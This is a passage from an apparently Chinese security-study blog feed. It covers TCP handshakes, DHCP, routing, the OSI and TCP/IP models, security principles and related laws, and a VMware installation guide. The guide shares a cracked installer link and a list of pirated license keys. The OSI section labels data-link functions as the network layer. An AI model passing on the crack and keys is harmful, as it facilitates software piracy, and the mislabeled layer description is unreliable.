&lt;h2 id=&#34;三次握手&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三次握手&#34;&gt;#&lt;/a&gt; 三次握手&lt;/h2&gt;
&lt;p&gt;三次握手（Three-Way Handshake）是指建立一个 TCP 连接时，需要客户端和服务端总共发送 3 个包以确认连接的建立。&lt;/p&gt;
&lt;p&gt;第一次握手客户端将标志位 SYN 置为 1，随机产生一个值 seq=s ，并将该数据包发送给服务端，客户端进入 SYN_SENT 状态，等待服务端确认。&lt;/p&gt;
&lt;p&gt;第二次握手服务端收到数据包后由标志位 SYN=1 知道客户端请求建立连接，服务端将标志位 SYN 和 ACK 都置为 1，ack=s+1，随机产生一个值 seq=k ，并将该数据包发送给客户端以确认连接请求，服务端进入 SYN_RCVD 状态。&lt;/p&gt;
&lt;p&gt;第三次握手客户端收到确认后，检查 ack 值是否为 s+1，ACK 标志位是否为 1，如果正确则将标志位 ACK 置为 1，ack=k+1，并将该数据包发送给服务端，服务端检查 ack 值是否为 k+1，ACK 标志位是否为 1，如果正确则连接建立成功，客户端和服务端进入 ESTABLISHED 状态，完成三次握手。&lt;/p&gt;
&lt;h2 id=&#34;四次挥手&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#四次挥手&#34;&gt;#&lt;/a&gt; 四次挥手&lt;/h2&gt;
&lt;p&gt;四次挥手（Four-Way Wavehand）指断开一个 TCP 连接时，需要客户端和服务端总共发送 4 个包以确认连接的断开。&lt;/p&gt;
&lt;p&gt;第一次挥手客户端发送一个 FIN ，用来关闭客户端到服务端的数据传送，客户端进入 FIN_WAIT_1 状态。&lt;/p&gt;
&lt;p&gt;第二次挥手服务端收到 FIN 后，发送一个 ACK 给客户端，确认序号为收到序号 + 1，服务端进入 CLOSE_WAIT 状态。&lt;/p&gt;
&lt;p&gt;第三次挥手服务端发送一个 FIN ，用来关闭服务端到客户端的数据传送，服务端进入 LAST_ACK 状态。&lt;/p&gt;
&lt;p&gt;第四次挥手客户端收到 FIN 后，客户端进入 TIME_WAIT 状态，接着发送一个 ACK 给服务端，确认序号为收到序号 + 1，服务端进入 CLOSED 状态，完成四次挥手。&lt;/p&gt;
&lt;h2 id=&#34;拥塞控制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#拥塞控制&#34;&gt;#&lt;/a&gt; 拥塞控制&lt;/h2&gt;
&lt;p&gt;拥塞是指网络中报文数量过多，使得服务端来不及处理，以致引起这部分乃至整个网络性能下降的现象，严重时甚至会导致网络通信业务陷入停顿即出现死锁现象。&lt;/p&gt;
&lt;p&gt;TCP 采用拥塞控制算法来减少或者避免拥塞现象的发生，TCP 的拥塞算法有过多种实现，包括 Tahoe、Reno、NewReno、Vegas、Hybla、BIC 、CUBIC、SACK、Westwood、PRR、BBR 等。&lt;/p&gt;
&lt;h1 id=&#34;dhcp协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dhcp协议&#34;&gt;#&lt;/a&gt; DHCP 协议&lt;/h1&gt;
&lt;h2 id=&#34;简介-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-2&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;动态主机配置协议 (Dynamic Host Configuration Protocol，DHCP) 是一个用于局域网的网络协议，位于 OSI 模型的应用层，使用 UDP 协议工作，主要用于自动分配 IP 地址给用户，方便管理员进行统一管理。&lt;/p&gt;
&lt;p&gt;DHCP 服务器端使用 67/udp，客户端使用 68/udp。DHCP 运行分为四个基本过程，分别为请求 IP 租约、提供 IP 租约、选择 IP 租约和确认 IP 租约。客户端在获得了一个 IP 地址以后，就可以发送一个 ARP 请求来避免由于 DHCP 服务器地址池重叠而引发的 IP 冲突。&lt;/p&gt;
&lt;h2 id=&#34;dhcp报文格式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dhcp报文格式&#34;&gt;#&lt;/a&gt; DHCP 报文格式&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|     op (1)    |   htype (1)   |   hlen (1)    |   hops (1)    |
+---------------+---------------+---------------+---------------+
|                            xid (4)                            |
+-------------------------------+-------------------------------+
|           secs (2)            |           flags (2)           |
+-------------------------------+-------------------------------+
|                          ciaddr  (4)                          |
+---------------------------------------------------------------+
|                          yiaddr  (4)                          |
+---------------------------------------------------------------+
|                          siaddr  (4)                          |
+---------------------------------------------------------------+
|                          giaddr  (4)                          |
+---------------------------------------------------------------+
|                          chaddr  (16)                         |
+---------------------------------------------------------------+
|                          sname   (64)                         |
+---------------------------------------------------------------+
|                          file    (128)                        |
+---------------------------------------------------------------+
|                          options (variable)                   |
+---------------------------------------------------------------+
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;路由算法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#路由算法&#34;&gt;#&lt;/a&gt; 路由算法&lt;/h1&gt;
&lt;h2 id=&#34;简介-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-3&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;路由算法是用于找到一条从源路由器到目的路由器的最佳路径的算法。存在着多种路由算法，每种算法对网络和路由器资源的影响都不同；由于路由算法使用多种度量标准 (metric)，所以不同路由算法的最佳路径选择也有所不同。&lt;/p&gt;
&lt;h2 id=&#34;路由选择算法的功能&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#路由选择算法的功能&#34;&gt;#&lt;/a&gt; 路由选择算法的功能&lt;/h2&gt;
&lt;p&gt;源 / 宿对之间的路径选择，以及选定路由之后将报文传送到它们的目的地。&lt;/p&gt;
&lt;p&gt;路由选择算法的要求：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;正确性：确保分组从源节点传送到目的节点&lt;/li&gt;
&lt;li&gt;简单性：实现方便，软硬件开销小&lt;/li&gt;
&lt;li&gt;自适应性：也称健壮性，算法能够适应业务量和网络拓扑的变化&lt;/li&gt;
&lt;li&gt;稳定性：能长时间无故障运行&lt;/li&gt;
&lt;li&gt;公平性：每个节点都有机会传送信息&lt;/li&gt;
&lt;li&gt;最优性：尽量选取好的路由&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;自治系统autonomous-system&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#自治系统autonomous-system&#34;&gt;#&lt;/a&gt; 自治系统（Autonomous System）&lt;/h2&gt;
&lt;p&gt;经典定义：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;由一个组织管理的一整套路由器和网络。&lt;/li&gt;
&lt;li&gt;使用一种 AS 内部的路由选择协议和共同的度量以确定分组在该 AS 内的路由。&lt;/li&gt;
&lt;li&gt;使用一种 AS 之间的路由选择协议用以确定分组在 AS 之间的路由。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;尽管一个 AS 使用了多种内部路由选择协议和度量，但对其他 AS 表现出的是一个单一的和一致的路由选择策略。&lt;/p&gt;
&lt;h2 id=&#34;rip&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rip&#34;&gt;#&lt;/a&gt; RIP&lt;/h2&gt;
&lt;p&gt;路由信息协议 (Routing Information Protocol, RIP) 是一种基于距离 向量的路由选择协议。RIP 协议要求网络中的每一个路由器都要维护从它自己到自治系统内其他每一个目的网络的距离和下一跳路由器地址。&lt;/p&gt;
&lt;h2 id=&#34;ospf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ospf&#34;&gt;#&lt;/a&gt; OSPF&lt;/h2&gt;
&lt;p&gt;开放最短路径优先 (Open Shortest Path First，OSPF)，这个算法名为 “最短路径优先” 是因为使用了 Dijkstra 提出的最短路径算法 SPF，只是一个协议的名字，它并不表示其他的路由选择协议不是 “最短路径优先”。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/netw/</guid>
            <title>计算机网络基础</title>
            <link>https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/netw/</link>
            <category>计算机网络</category>
            <category>网络协议</category>
            <pubDate>Thu, 24 Nov 2022 10:45:44 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;网络基础&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络基础&#34;&gt;#&lt;/a&gt; 网络基础&lt;/h1&gt;
&lt;h2 id=&#34;计算机通信网的组成&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#计算机通信网的组成&#34;&gt;#&lt;/a&gt; 计算机通信网的组成&lt;/h2&gt;
&lt;p&gt;计算机网络由通信子网和资源子网组成。其中通信子网负责数据的无差错和有序传递，其处理功能包括差错控制、流量控制、路由选择、网络互连等。其中资源子网是计算机通信的本地系统环境，包括主机、终端和应用程序等，资源子网的主要功能是用户资源配置、数据的处理和管理、软件和硬件共享以及负载均衡等。总的来说，计算机通信网就是一个由通信子网承载的、传输和共享资源子网的各类信息的系统。&lt;/p&gt;
&lt;h2 id=&#34;通信协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#通信协议&#34;&gt;#&lt;/a&gt; 通信协议&lt;/h2&gt;
&lt;p&gt;为了完成计算机之间有序的信息交换，提出了通信协议的概念，其定义是相互通信的双方（或多方）对如何进行信息交换所必须遵守的一整套规则。&lt;/p&gt;
&lt;p&gt;协议涉及到三个要素，分别为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;语法：语法是用户数据与控制信息的结构与格式，以及数据出现顺序的意义&lt;/li&gt;
&lt;li&gt;语义：用于解释比特流的每一部分的意义&lt;/li&gt;
&lt;li&gt;时序：事件实现顺序的详细说明&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;osi七层模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#osi七层模型&#34;&gt;#&lt;/a&gt; OSI 七层模型&lt;/h2&gt;
&lt;h3 id=&#34;物理层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#物理层&#34;&gt;#&lt;/a&gt; 物理层&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;提供建立、维护和释放物理链路所需的机械、电气功能和规程等特性&lt;/li&gt;
&lt;li&gt;通过传输介质进行数据流 (比特流) 的物理传输、故障监测和物理层管理&lt;/li&gt;
&lt;li&gt;从数据链路层接收帧，将比特流转换成底层物理介质上的信号&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;网络层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络层&#34;&gt;#&lt;/a&gt; 网络层&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;在物理链路的两端之间传输数据&lt;/li&gt;
&lt;li&gt;在网络层实体间提供数据传输功能和控制&lt;/li&gt;
&lt;li&gt;提供数据的流量控制&lt;/li&gt;
&lt;li&gt;检测和纠正物理链路产生的差错&lt;/li&gt;
&lt;li&gt;格式化的消息称为帧&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;传输层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#传输层&#34;&gt;#&lt;/a&gt; 传输层&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;提供无差错的数据传输&lt;/li&gt;
&lt;li&gt;接收来自会话层的数据，如果需要，将数据分割成更小的分组，向网络层传送分组并确保分组完整和正确到达它们的目的地&lt;/li&gt;
&lt;li&gt;在系统之间提供可靠的透明的数据传输，提供端到端的错误恢复和流量控制&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;会话层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#会话层&#34;&gt;#&lt;/a&gt; 会话层&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;提供节点之间通信过程的协调&lt;/li&gt;
&lt;li&gt;负责执行会话规则（如：连接是否允许半双工或全双工通信）、同步数据流以及当故障发生时重新建立连接&lt;/li&gt;
&lt;li&gt;使用上面的表示层和下面的传输层的功能&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;表示层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#表示层&#34;&gt;#&lt;/a&gt; 表示层&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;提供数据格式、变换和编码转换&lt;/li&gt;
&lt;li&gt;涉及正在传输数据的语法和语义&lt;/li&gt;
&lt;li&gt;将消息以合适电子传输的格式编码&lt;/li&gt;
&lt;li&gt;执行该层的数据压缩和加密&lt;/li&gt;
&lt;li&gt;从应用层接收消息，转换格式，并传送到会话层，该层常合并在应用层中&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;应用层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#应用层&#34;&gt;#&lt;/a&gt; 应用层&lt;/h3&gt;
&lt;p&gt;包括各种协议，它们定义了具体的面向用户的应用：如电子邮件、文件传输等&lt;/p&gt;
&lt;h3 id=&#34;总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结&lt;/h3&gt;
&lt;p&gt;低三层模型属于通信子网，涉及为用户间提供透明连接，操作主要以每条链路（ hop-by-hop）为基础，在节点间的各条数据链路上进行通信。由网络层来控制各条链路上的通信，但要依赖于其他节点的协调操作。&lt;/p&gt;
&lt;p&gt;高三层属于资源子网，主要涉及保证信息以正确可理解形式传送。&lt;/p&gt;
&lt;p&gt;传输层是高三层和低三层之间的接口，它是第一个端到端的层次，保证透明的端到端连接，满足用户的服务质量（QoS）要求，并向高三层提供合适的信息形式。&lt;/p&gt;
&lt;h2 id=&#34;tcpip四层模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tcpip四层模型&#34;&gt;#&lt;/a&gt; TCP/IP 四层模型&lt;/h2&gt;
&lt;h3 id=&#34;网络接口层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络接口层&#34;&gt;#&lt;/a&gt; 网络接口层&lt;/h3&gt;
&lt;p&gt;网络接入层与 OSI 参考模型中的物理层和数据链路层相对应。它负责监视数据在主机和网络之间的交换。事实上，TCP/IP 本身并未定义该层的协议，而由参与互连的各网络使用自己的物理层和数据链路层协议，然后与 TCP/IP 的网络接入层进行连接。地址解析协议（ARP）工作在此层，即 OSI 参考模型的数据链路层。&lt;/p&gt;
&lt;h3 id=&#34;网际层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网际层&#34;&gt;#&lt;/a&gt; 网际层&lt;/h3&gt;
&lt;p&gt;网际层对应于 OSI 参考模型的网络层，主要解决主机到主机的通信问题。它所包含的协议设计数据包在整个网络上的逻辑传输。注重重新赋予主机一个 IP 地址来完成对主机的寻址，它还负责数据包在多种网络中的路由。该层有三个主要协议：网际协议（IP）、互联网组管理协议（IGMP）和互联网控制报文协议（ICMP）。&lt;/p&gt;
&lt;h3 id=&#34;运输层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#运输层&#34;&gt;#&lt;/a&gt; 运输层&lt;/h3&gt;
&lt;p&gt;运输层对应于 OSI 参考模型的传输层，为应用层实体提供端到端的通信功能，保证了数据包的顺序传送及数据的完整性。该层定义了两个主要的协议：传输控制协议（TCP）和用户数据报协议（UDP)&lt;/p&gt;
&lt;h3 id=&#34;应用层-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#应用层-2&#34;&gt;#&lt;/a&gt; 应用层&lt;/h3&gt;
&lt;p&gt;应用层对应于 OSI 参考模型的高层，为用户提供所需要的各种服务，例如：FTP、Telnet、DNS、SMTP 等&lt;/p&gt;
&lt;h2 id=&#34;osi模型与tcpip模型对比&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#osi模型与tcpip模型对比&#34;&gt;#&lt;/a&gt; OSI 模型与 TCP/IP 模型对比&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/11/24/7PVpnCLrqtSUDOM.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;共同点&lt;br /&gt;
（1）OSI 参考模型和 TCP/IP 参考模型都采用了层次结构的概念。&lt;br /&gt;
（2）都能够提供面向连接和无连接两种通信服务机制。&lt;br /&gt;
不同点&lt;br /&gt;
（1）OSI 采用的七层模型，而 TCP/IP 是四层结构。&lt;br /&gt;
（2）TCP/IP 参考模型的网络接口层实际上并没有真正的定义，只是一些概念性的描述。而 OSI 参考模型不仅分了两层，而且每一层的功能都很详尽，甚至在数据链路层又分出一个介质访问子层，专门解决局域网的共享介质问题。&lt;br /&gt;
（3）OSI 模型是在协议开发前设计的，具有通用性。TCP/IP 是先有协议集然后建立模型，不适用于非 TCP/IP 网络。&lt;br /&gt;
（4）OSI 参考模型与 TCP/IP 参考模型的传输层功能基本相似，都是负责为用户提供真正的端对端的通信服务，也对高层屏蔽了底层网络的实现细节。所不同的是 TCP/IP 参考模型的传输层是建立在网络互联层基础之上的，而网络互联层只提供无连接的网络服务，所以面向连接的功能完全在 TCP 协议中实现，当然 TCP/IP 的传输层还提供无连接的服务，如 UDP；相反 OSI 参考模型的传输层是建立在网络层基础之上的，网络层既提供面向连接的服务，又提供无连接的服务，但传输层只提供面向连接的服务。&lt;br /&gt;
（5）OSI 参考模型的抽象能力高，适合与描述各种网络；而 TCP/IP 是先有了协议，才制定 TCP/IP 模型的。&lt;br /&gt;
（6）OSI 参考模型的概念划分清晰，但过于复杂；而 TCP/IP 参考模型在服务、接口和协议的 区别上不清楚，功能描述和实现细节混在一起。&lt;br /&gt;
（7）TCP/IP 参考模型的网络接口层并不是真正的一层；OSI 参考模型的缺点是层次过多，划分意义不大但增加了复杂性。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/netwsecu/</guid>
            <title>网络安全观</title>
            <link>https://mobius-0.github.io/security/WebNote/netwsecu/</link>
            <category>网络安全</category>
            <category>法律法规</category>
            <pubDate>Thu, 24 Nov 2022 10:25:18 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;网络安全定义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络安全定义&#34;&gt;#&lt;/a&gt; 网络安全定义&lt;/h1&gt;
&lt;p&gt;网络安全的一个通用定义指网络信息系统的硬件、软件及其系统中的数据受到保护，不因偶然的或者恶意的破坏、更改、泄露，系统能连续、可靠、正常地运行，服务不中断。网络安全简单的说是在网络环境下能够识别和消除不安全因素的能力。&lt;/p&gt;
&lt;p&gt;网络安全在不同环境和应用中有不同的解释，例如系统运行的安全、系统信息内容的安全、信息通信与传播的安全等。&lt;/p&gt;
&lt;p&gt;网络安全的基本需求包括可靠性、可用性、保密性、完整性、不可抵赖性、可控性、可审查性、真实性等。其中三个最基本的要素是机密性 (Confidentiality)、完整性 (Integrity)、可用性 (Availability)。&lt;/p&gt;
&lt;p&gt;机密性是不将有用信息泄漏给非授权用户的特性。可以通过信息加密、身份认证、访问控制、安全通信协议等技术实现，信息加密是防止信息非法泄露的最基本手段，主要强调有用信息只被授权对象使用的特征。&lt;/p&gt;
&lt;p&gt;完整性是指信息在传输、交换、存储和处理过程中，保持信息不被破坏或修改、不丢失和信息未经授权不能改变的特性，也是最基本的安全特征。&lt;/p&gt;
&lt;p&gt;可用性指信息资源可被授权实体按要求访问、正常使用或在非正常情况下能恢复使用的特性。在系统运行时正确存取所需信息，当系统遭受意外攻击或破坏时，可以迅速恢复并能投入使用。是衡量网络信息系统面向用户的一种安全性能，以保障为用户提供服务。&lt;/p&gt;
&lt;p&gt;网络安全的主体是保护网络上的数据和通信的安全，数据安全性是指软硬件保护措施，用来阻止对数据进行非授权的泄漏、转移、修改和破坏等，通信安全性是通信保护措施，要求在通信中采用保密安全性、传输安全性、辐射安全性等措施。&lt;/p&gt;
&lt;h1 id=&#34;相关法律法规&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关法律法规&#34;&gt;#&lt;/a&gt; 相关法律法规&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5ucGMuZ292LmNuL25wYy9jMzA4MzQvMjAxNjExLzI3MGI0M2U4YjM1ZTRmN2VhOTg1MDJiNmYwZTI2ZjhhLnNodG1s&#34;&gt;中华人民共和国网络安全法&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5nb3YuY24vemhlbmdjZS96aGVuZ2Nla3UvMjAyMS0wNy8xNC9jb250ZW50XzU2MjQ5NjUuaHRt&#34;&gt;网络产品安全漏洞管理规定&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5nb3YuY24vemhlbmdjZS9jb250ZW50LzIwMjEtMDgvMTcvY29udGVudF81NjMxNjcxLmh0bQ==&#34;&gt;关键信息基础设施安全保护条例&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5ucGMuZ292LmNuL25wYy9jMzA4MzQvMjAyMTA4L2E4YzRlMzY3MmM3NDQ5MWE4MGI1M2ExNzJiYjc1M2ZlLnNodG1s&#34;&gt;中华人民共和国个人信息保护法&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5ucGMuZ292LmNuL25wYy9jMzA4MzQvMjAyMTA2LzdjOWFmMTJmNTEzMzRhNzNiNTZkNzkzOGY5OWE3ODhhLnNodG1s&#34;&gt;中华人民共和国数据安全法&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/VMware/</guid>
            <title>虚拟机安装</title>
            <link>https://mobius-0.github.io/security/VMware/</link>
            <category>网络安全</category>
            <category>工具</category>
            <category>虚拟机</category>
            <pubDate>Wed, 23 Nov 2022 10:52:33 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;关于虚拟化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关于虚拟化&#34;&gt;#&lt;/a&gt; 关于虚拟化&lt;/h1&gt;
&lt;p&gt;虚拟化技术在目前的互联网中算是非常关键的基础技术之一，细分下去可以有服务器虚拟化、网络虚拟化、应用虚拟化等等，这里我们要做的主要是物理机的虚拟化，也可以说是服务器的虚拟化。&lt;/p&gt;
&lt;p&gt;服务器的虚拟化又可以分为两种实现方式：寄居虚拟化和裸机虚拟化&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;寄居虚拟化即将虚拟化服务部署在物理机已经安装好的操作系统上，这样效率和稳定性较低，但模式简单；而裸机虚拟化则将虚拟化读物直接部署在物理机上，效率较高，且在合理的逻辑划分下安全性和稳定性都有了较大的提高&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这里我们会用到的是寄居虚拟化，也就是在现有操作系统上安装虚拟化服务软件如 VMware Workstation、Virtual Box 等。&lt;/p&gt;
&lt;h1 id=&#34;虚拟化服务软件的安装&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#虚拟化服务软件的安装&#34;&gt;#&lt;/a&gt; 虚拟化服务软件的安装&lt;/h1&gt;
&lt;p&gt;各自虚拟化服务软件间其实大同小异，所以这里就只关注 Vmware Workstation 的安装&lt;/p&gt;
&lt;h2 id=&#34;vmware安装包&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#vmware安装包&#34;&gt;#&lt;/a&gt; VMware 安装包&lt;/h2&gt;
&lt;p&gt;在之前 VMware 还是免费的，但后来就开始收费购买使用，现在适用于桌面级的有三种版本：&lt;/p&gt;
&lt;p&gt;VMware Fusion（for mac）：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudm13YXJlLmNvbS9wcm9kdWN0cy9mdXNpb24uaHRtbA==&#34;&gt;https://www.vmware.com/products/fusion.html&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;VMware Workstation Player（free for Windows and Linux）：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudm13YXJlLmNvbS9wcm9kdWN0cy93b3Jrc3RhdGlvbi1wbGF5ZXIuaHRtbA==&#34;&gt;https://www.vmware.com/products/workstation-player.html&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;VMware Workstation Pro（for Windows and Linux）：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudm13YXJlLmNvbS9wcm9kdWN0cy93b3Jrc3RhdGlvbi1wcm8uaHRtbA==&#34;&gt;https://www.vmware.com/products/workstation-pro.html&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;这里也贴一个 workstation pro 15.5 的破解安装包：链接: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMXB3WlFvcEJVM0tCWlRVaU9hSEwxSGc=&#34;&gt;https://pan.baidu.com/s/1pwZQopBU3KBZTUiOaHL1Hg&lt;/span&gt;  提取码: 1919&lt;/p&gt;
&lt;h2 id=&#34;安装过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安装过程&#34;&gt;#&lt;/a&gt; 安装过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;双击运行安装 exe&lt;/li&gt;
&lt;li&gt;接受条款，下一步&lt;/li&gt;
&lt;li&gt;选择安装目录，建议不要安装在 C 盘上，选项全部勾选&lt;/li&gt;
&lt;li&gt;“检查更新” 和 “加入体验计划” 选项视情况而定，可选可不选&lt;/li&gt;
&lt;li&gt;勾选创建快捷方式&lt;/li&gt;
&lt;li&gt;下一步至安装，并等待安装完成&lt;/li&gt;
&lt;li&gt;安装完成后双击快捷方式打开&lt;/li&gt;
&lt;li&gt;此时会要求你输入激活码，可以选择试用，也可以上网百度一下激活码，有的可以用，多试一试，这里贴几个网络上的 workstation pro 15.5 的激活码&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;VG5HH-D6E04-0889Y-QXZET-QGUC8
CY55A-F6G80-H85HQ-WNN5X-W38W4
AC11H-4HZ05-08EDQ-APQGX-YCUC8
ZG780-8EZ9M-M89LY-M5PEG-W2AZ8
AU15R-A0Z4N-M88HY-HQYNX-QYKD6
VY110-4RD50-H886P-5FMN9-WPUUD
GF302-4HW44-H88DQ-WZXNV-Q3R94
UA752-0KF9J-0811Y-MQNEX-ZUAGF
ZF3NU-D6XEJ-48E7Q-27YNC-PC8ED
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;ol start=&#34;9&#34;&gt;
&lt;li&gt;激活成功进入首页即可完成安装&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;虚拟机的搭建&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#虚拟机的搭建&#34;&gt;#&lt;/a&gt; 虚拟机的搭建&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;首先必须要下载好你想要安装的虚拟机的操作系统镜像，比如 Windows、Ubuntu 等，当然也会有有的操作系统已经帮你安装好虚拟机上打包好了的，比如 Kali。这里放两个示例镜像的连接&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;Windows 10：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubWljcm9zb2Z0LmNvbS96aC1jbi9zb2Z0d2FyZS1kb3dubG9hZC93aW5kb3dzMTA=&#34;&gt;https://www.microsoft.com/zh-cn/software-download/windows10&lt;/span&gt; （进入后点击 “立即下载工具” 即可，当然这个也需要激活才能使用全部功能，但实际上不激活也不影响正常使用）&lt;/p&gt;
&lt;p&gt;Ubuntu：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly91YnVudHUuY29tL2Rvd25sb2FkL2Rlc2t0b3A=&#34;&gt;https://ubuntu.com/download/desktop&lt;/span&gt; （进入点击 “download” 即可）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;打开虚拟机，点击 “创建虚拟机”&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通常建议新手接下来选择 “典型” 配置，这样配置设置要简单一点，当然也可以选择 “自定义”，这样要选择的设置就多一点。 &lt;span class=&#34;spoiler&#34; title=&#34;你知道的太多了&#34;&gt;其实两种配置本质上没有多大区别，以后用的多了完全可以再修改虚拟机的设置，修改资源分配&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;这里为了展示得更全面，选择 “自定义” 配置，在硬件兼容性上通常选择与当前虚拟机软件版本一致的选项，例如当前为 workstation pro 16，兼容性就选择 workstation 16.x&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;选择 “安装程序光盘映像文件”，然后浏览选择你下载好的系统镜像，下一步&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;命名请随意，位置建议不要放在 C 盘&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;处理器配置可默认，当然安装后也可以修改&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
